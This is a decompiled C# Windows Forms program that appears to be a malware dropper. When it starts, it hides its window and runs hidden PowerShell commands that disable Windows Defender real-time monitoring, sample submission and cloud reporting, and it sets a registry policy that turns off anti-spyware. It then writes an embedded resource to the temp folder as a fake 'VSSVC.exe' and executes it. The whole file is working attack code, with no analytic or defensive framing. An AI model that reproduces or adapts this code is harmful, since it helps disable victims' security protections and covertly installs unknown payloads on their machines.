using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using ___.Properties;

namespace ___;

public class Form1 : Form
{
	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	public static string Base64Decode(string base64EncodeData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodeData);
		return Encoding.UTF8.GetString(bytes);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		a();
	}

	public static void a()
	{
		Process.EnterDebugMode();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "powershell.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "Set-MpPreference -DisableRealtimeMonitoring $true";
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "powershell.exe";
		processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo2.Arguments = "Set-MpPreference -SubmitSamplesConsent NeverSend";
		ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
		processStartInfo3.FileName = "powershell.exe";
		processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo3.Arguments = "Set-MpPreference -MAPSReporting Disable";
		ProcessStartInfo processStartInfo4 = new ProcessStartInfo();
		processStartInfo4.FileName = "powershell.exe";
		processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo4.Arguments = "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force";
		Process.Start(processStartInfo);
		Process.Start(processStartInfo2);
		Process.Start(processStartInfo3);
		Process.Start(processStartInfo4);
		d();
	}

	public static void d()
	{
		string tempPath = Path.GetTempPath();
		File.WriteAllBytes(tempPath + "VSSVC.exe", Resources.DL);
		Process.Start(tempPath + "VSSVC.exe");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
